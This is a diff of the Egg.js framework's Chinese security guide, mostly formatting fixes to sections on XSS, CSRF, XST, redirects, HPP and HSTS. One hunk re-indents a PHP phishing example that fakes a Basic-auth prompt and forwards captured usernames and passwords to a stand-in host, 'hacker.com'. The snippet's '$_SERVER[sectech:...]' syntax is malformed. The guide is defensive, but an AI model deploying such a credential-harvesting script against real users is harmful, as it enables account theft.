@@ -67,7 +67,7 @@ exports.security = {
 
 ```
 
-__注意：不能同时存在 match 和 ignore ，否则会报错__
+**注意：不能同时存在 match 和 ignore ，否则会报错。**
 
 下面我们会针对具体的场景，来讲解如何使用框架提供的安全方案进行 web 安全防范。
 
@@ -96,7 +96,7 @@ console.log(ctx.helper.escape(str));
 // => &gt;&lt;script&gt;alert(&quot;abc&quot;) &lt;/script&gt;&lt;
 ```
 
-当网站需要直接输出用户输入的结果时，请务必使用 `helper.escape()` 包裹起来
+当网站需要直接输出用户输入的结果时，请务必使用 `helper.escape()` 包裹起来，如在 [egg-view-nunjucks] 里面就覆盖掉了内置的 `escape`。
 
 另外一种情况，网站输出的内容会提供给 JavaScript 来使用。这个时候需要使用`helper.sjs()`来进行过滤。
 
@@ -115,14 +115,14 @@ console.log(`var foo = "${this.helper.sjs(foo)}";`);
 // => var foo = "\\x22hello\\x22";
 ```
 
-还有一种情况，有时候我们需要在 JavaScript 中输出 json ，若未做转义，易被利用为 XSS 漏洞。框架提供了 `helper.sjson()` 宏做json encode，会遍历 json 中的 key ，将 value 的值中，所有非白名单字符转义为`\x`形式，防止 XSS 攻击。同时保持 json 结构不变。
-若存在模板中输出一个 json 字符串给 JavaScript 使用的场景，请使用 `${this.helper.sjson(变量名)}` 进行转义。
+还有一种情况，有时候我们需要在 JavaScript 中输出 json ，若未做转义，易被利用为 XSS 漏洞。框架提供了 `helper.sjson()` 宏做 json encode，会遍历 json 中的 key ，将 value 的值中，所有非白名单字符转义为`\x`形式，防止 XSS 攻击。同时保持 json 结构不变。
+若存在模板中输出一个 JSON 字符串给 JavaScript 使用的场景，请使用 `${this.helper.sjson(变量名)}` 进行转义。
 
-**处理过程较复杂，性能损耗较大，尽量避免使用**
+**处理过程较复杂，性能损耗较大，请仅在必要时使用。**
 
 实例:
 
-```js
+```html
   <script>
     window.locals = ${this.helper.sjson(locals)};
   </script>
@@ -139,7 +139,7 @@ console.log(`var foo = "${this.helper.sjs(foo)}";`);
 注意，将富文本（包含 html 代码的文本）当成变量直接在模版里面输出时，需要用到 shtml 来处理。
 使用 shtml 可以输出 html 的 tag，同时执行 XSS 的过滤动作，过滤掉非法的脚本。
 
-** 由于是一个非常复杂的安全处理过程，对服务器处理性能一定影响，如果不是输出 HTML，请勿使用。**
+**由于是一个非常复杂的安全处理过程，对服务器处理性能一定影响，如果不是输出 HTML，请勿使用。**
 
 简单示例：
 
@@ -164,13 +164,13 @@ const value = `<a href="http://www.domain.com">google</a><script>evilcode…</sc
 shtml 在 [xss](https://github.com/leizongmin/js-xss/) 模块基础上增加了针对域名的过滤。
 
 - [默认规则](https://github.com/leizongmin/js-xss/blob/master/lib/default.js)
-- 自定义过滤项 http://jsxss.com/zh/options.html
+- 自定义过滤项： http://jsxss.com/zh/options.html
 
 例如只支持 a 标签，且除了 title 其他属性都过滤掉： `whiteList: {a: ['title']}`
 
 options:
 
-- `config.helper.shtml.domainWhiteList: []` 可拓展 href 和 src 中可出现的域名白名单。
+- `config.helper.shtml.domainWhiteList: []` 可拓展 href 和 src 中允许的域名白名单。
 
 注意，shtml 使用了严格的白名单机制，除了过滤掉 XSS 风险的字符串外，
 在 [默认规则](https://github.com/leizongmin/js-xss/blob/master/lib/default.js) 外的 tag 和 attr 都会被过滤掉。
@@ -206,12 +206,12 @@ jsonp 的 callback 参数非常危险，他有两种风险可能导致 XSS
 防御内容：
 
 * callback 函数名词最长 50 个字符限制
-* callback 函数名只允许"[","]","a-zA-Z0123456789_", "$", ".",防止一般的 XSS，utf-7 XSS等攻击
+* callback 函数名只允许 `[`, `]`, `a-zA-Z0123456789_`, `$`, `.`，防止一般的 XSS，utf-7 XSS等攻击。
 
 可定义配置：
 
-* callback 默认 `_callback`，可以重命名
-* limit - 函数名 length 限制，默认 50
+* callback 默认 `_callback`，可以重命名。
+* limit - 函数名 length 限制，默认 50。
 
 ### 其他 XSS 的防范方式
 
@@ -221,7 +221,7 @@ jsonp 的 callback 参数非常危险，他有两种风险可能导致 XSS
 
 W3C 的 Content Security Policy，简称 CSP，主要是用来定义页面可以加载哪些资源，减少 XSS 的发生。
 
-框架内支持 CSP 的配置，不过是默认关闭的，开启后可以有效的防止 XSS 攻击的发生。要配置 CSP , 需要对 CSP 的 policy 策略有了解，具体细节可以参考 [CSP 是什么](https://www.zhihu.com/question/21979782) 
+框架内支持 CSP 的配置，不过是默认关闭的，开启后可以有效的防止 XSS 攻击的发生。要配置 CSP , 需要对 CSP 的 policy 策略有了解，具体细节可以参考 [CSP 是什么](https://www.zhihu.com/question/21979782)。
 
 #### X-Download-Options:noopen
 
@@ -239,12 +239,12 @@ IE 提供的一些 XSS 检测与防范，默认开启
 
 ## 安全威胁` CSRF `的防范
 
-[CSRF](https://www.owasp.org/index.php/CSRF)（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者 Session Riding，通常缩写为 CSRF 或者 XSRF，是一种对网站的恶意利用。
+[CSRF](https://www.owasp.org/index.php/CSRF)（Cross-site request forgery跨站请求伪造，也被称为 `One Click Attack` 或者 `Session Riding`，通常缩写为 CSRF 或者 XSRF，是一种对网站的恶意利用。
 CSRF 攻击会对网站发起恶意伪造的请求，严重影响网站的安全。因此框架内置了 CSRF 防范方案。
 
 ### 防范方式
 
-框架内部针对表单 POST 请求均会验证 CSRF 的值，会把用户提交的 CSRF key 与当前上下文上的 CSRF key 进行对比，避免请求被伪造。
+框架内部针对表单 POST 请求均会验证 CSRF 的值，会把用户提交的 CSRF key 与当前上下文中的 CSRF key 进行对比，避免请求被伪造。
 因此我们在表单提交时，请带上 CSRF key 进行提交。页面渲染时，将 `ctx.csrf` 作为 form 隐藏域或 query string 渲染在页面上，在提交表单时，带上 token 即可。
 
 #### 例子：通过formData上传时使用 CSRF
@@ -259,9 +259,11 @@ CSRF 攻击会对网站发起恶意伪造的请求，严重影响网站的安全
 </form>
 ```
 
+[egg-view-nunjucks] 等 view 插件会自动对 form 进行注入，对应用开发者无感知。
+
 ## 安全威胁` XST `的防范
 
-[XST](https://www.owasp.org/index.php/XST) 的全称是 Cross-Site Tracing，客户端发 TRACE 请求至服务器，如果服务器按照标准实现了 TRACE 响应，则在 response body 里会返回此次请求的完整头信息。通过这种方式，客户端可以获取某些敏感的头字段，例如 httpOnly 的 cookie。
+[XST](https://www.owasp.org/index.php/XST) 的全称是 `Cross-Site Tracing`，客户端发 TRACE 请求至服务器，如果服务器按照标准实现了 TRACE 响应，则在 response body 里会返回此次请求的完整头信息。通过这种方式，客户端可以获取某些敏感的头字段，例如 httpOnly 的 cookie。
 
 下面我们基于 koa 来实现一个简单的支持 TRACE 方法的服务器：
 
@@ -343,20 +345,21 @@ http://deadliestwebattacks.com/2010/05/18/cross-site-tracing-xst-the-misundersto
 
 - 若跳转的 url 事先是可以确定的，包括 url 和参数的值，则可以在后台先配置好，url 参数只需传对应 url 的索引即可，通过索引找到对应具体 url 再进行跳转；
 - 若跳转的 url 事先不确定，但其输入是由后台生成的（不是用户通过参数传人），则可以先生成好跳转链接然后进行签名；
-- 若1和2都不满足，url 事先无法确定，只能通过前端参数传入，则必须在跳转的时候对 url 进行按规则校验：判断 url 是否在公司授权的白名单内。
+- 若 1 和 2 都不满足，url 事先无法确定，只能通过前端参数传入，则必须在跳转的时候对 url 进行按规则校验：判断 url 是否在应用授权的白名单内。
 
 框架提供了安全跳转的方法，可以通过配置白名单避免这种风险。
 
-* `ctx.redirect(url)` 如果不在配置的白名单内，则禁止
-* `ctx.unsafeRedirect(url)` 一般不建议使用，明确了解可能带来的风险后使用
+* `ctx.redirect(url)` 如果不在配置的白名单内，则禁止。
+* `ctx.unsafeRedirect(url)` 一般不建议使用，明确了解可能带来的风险后使用。
 
 安全方案覆盖了默认的`ctx.redirect`方法，所有的跳转均会经过安全域名的判断。
 
 用户如果使用`ctx.redirect`方法，需要在应用的配置文件中做如下配置：
 
 ```js
+// config/config.default.js
 exports.security = {
-  domainWhiteList:['.domain.com'],  // 安全白名单，以.开头
+  domainWhiteList:['.domain.com'],  // 安全白名单，以 . 开头
 };
 ```
 
@@ -374,13 +377,13 @@ exports.security = {
 401.php：作用为弹出 401 窗口，并且记录用户信息。
 
 ```php
-  <?php 
-      header('WWW-Authenticate: Basic realm="No authorization"'); 
-      header('HTTP/1.1 401 Unauthorized'); 
-          $domain = "http://hacker.com/fishing/"; 
-          if ($_SERVER[sectech:'PHP_AUTH_USER'] !== null){ 
-                  header("Location: ".$domain."record.php?a=".$_SERVER[sectech:'PHP_AUTH_USER']."&b=".$_SERVER[sectech:'PHP_AUTH_PW']); 
-          } 
+  <?php
+      header('WWW-Authenticate: Basic realm="No authorization"');
+      header('HTTP/1.1 401 Unauthorized');
+          $domain = "http://hacker.com/fishing/";
+          if ($_SERVER[sectech:'PHP_AUTH_USER'] !== null){
+                  header("Location: ".$domain."record.php?a=".$_SERVER[sectech:'PHP_AUTH_USER']."&b=".$_SERVER[sectech:'PHP_AUTH_PW']);
+          }
   ?>
 ```
 
@@ -432,28 +435,23 @@ output:
 
 ## 安全威胁` HPP `的防范
 
-Http Parameter Pollution（HPP)，即 HTTP 参数污染攻击。在HTTP协议中是允许同样名称的参数出现多次，而
-由于应用的实现不规范，攻击者通过传播参数的时候传输 key 相同而 value 不同的参数，从而达到绕过某些防护的后果。
+Http Parameter Pollution（HPP)，即 HTTP 参数污染攻击。在HTTP协议中是允许同样名称的参数出现多次，而由于应用的实现不规范，攻击者通过传播参数的时候传输 key 相同而 value 不同的参数，从而达到绕过某些防护的后果。
 
 HPP 可能导致的安全威胁有：
 
-1、绕过防护和参数校验；
-
-2、产生逻辑漏洞和报错，影响应用代码执行；
+- 绕过防护和参数校验。
+- 产生逻辑漏洞和报错，影响应用代码执行。
 
 ### 拓展阅读
 
-1、https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)
-
-2、http://blog.csdn.net/eatmilkboy/article/details/6761407
-
-3、https://media.blackhat.com/bh-us-11/Balduzzi/BH_US_11_Balduzzi_HPP_WP.pdf
-
-4、ebay因参数污染存在RCE（远程命令执行）漏洞：http://secalert.net/2013/12/13/ebay-remote-code-execution/
+- https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)
+- http://blog.csdn.net/eatmilkboy/article/details/6761407
+- https://media.blackhat.com/bh-us-11/Balduzzi/BH_US_11_Balduzzi_HPP_WP.pdf
+- ebay 因参数污染存在 RCE（远程命令执行）漏洞：http://secalert.net/2013/12/13/ebay-remote-code-execution/
 
 ### 如何防范
 
-框架本身会在客户端传输 key 相同而 value 不同的参数时，强制使用第一个参数，因此不会导致 hpp 攻击
+框架本身会在客户端传输 key 相同而 value 不同的参数时，强制使用第一个参数，因此不会导致 hpp 攻击。
 
 ## [中间人攻击](https://www.owasp.org/index.php/Man-in-the-middle_attack)与 HTTP / HTTPS
 
@@ -467,20 +465,20 @@ HTTP 是网络应用广泛使用的协议，负责 web 内容的请求和获取�
 
 因此，请各位使用 egg 框架开发网站的开发者，务必推动自己的网站升级到 HTTPS。
 
-对于 HTTPS 来讲，还有一点要注意的是HTTP 严格传输安全（HSTS），如果不使用HSTS，当用户在浏览器中输入网址时没有加 HTTPS，浏览器会默认使用http访问
+对于 HTTPS 来讲，还有一点要注意的是 HTTP 严格传输安全（HSTS），如果不使用 HSTS，当用户在浏览器中输入网址时没有加 HTTPS，浏览器会默认使用 HTTP 访问
 
-框架提供了 `hsts Strict-Transport-Security` 这个头的默认开启。让 HTTPS 站点不跳转到http，如果站点支持 HTTPS，请一定要开启。
+框架提供了 `hsts Strict-Transport-Security` 这个头的默认开启。让 HTTPS 站点不跳转到 HTTP，如果站点支持 HTTPS，请一定要开启。
 
 如果我们的web站点是 http 站点，需要关闭这个头。配置如下：
-  
-- maxAge 默认一年 `365 * 24 * 3600`
-- includeSubdomains 默认 false, 可以添加子域名，保证所有子域名都使用 HTTPS 访问
+
+- maxAge 默认一年 `365 * 24 * 3600`。
+- includeSubdomains 默认 false, 可以添加子域名，保证所有子域名都使用 HTTPS 访问。
 
 ## 其他安全工具
 
 ### ctx.isSafeDomain(domain)
 
-是否为安全域名。安全域名在配置中配置，见 `ctx.redirect` 部分
+是否为安全域名。安全域名在配置中配置，见 `ctx.redirect` 部分。
 
 ### app.injectCsrf(str)
 
@@ -488,10 +486,13 @@ HTTP 是网络应用广泛使用的协议，负责 web 内容的请求和获取�
 
 ### app.injectNonce(str)
 
-这个函数提供了模板预处理－自动插入 nonce 的能力，如果网站开启了 CSP 安全头，并且想使用 ` CSP 2.0 nonce` 特性，可以使用这个函数。参考[CSP 是什么](https://www.zhihu.com/question/21979782)
+这个函数提供了模板预处理－自动插入 nonce 的能力，如果网站开启了 CSP 安全头，并且想使用 ` CSP 2.0 nonce` 特性，可以使用这个函数。参考 [CSP 是什么](https://www.zhihu.com/question/21979782)。
 
 这个函数会扫描模板中的 script 标签，并自动加上 nonce 头。
 
 ### app.injectHijackingDefense(str)
 
 对于没有开启 HTTPS 的网站，这个函数可以有限的防止运营商劫持。
+
+
+[egg-view-nunjucks]: https://github.com/eggjs/egg-view-nunjucks
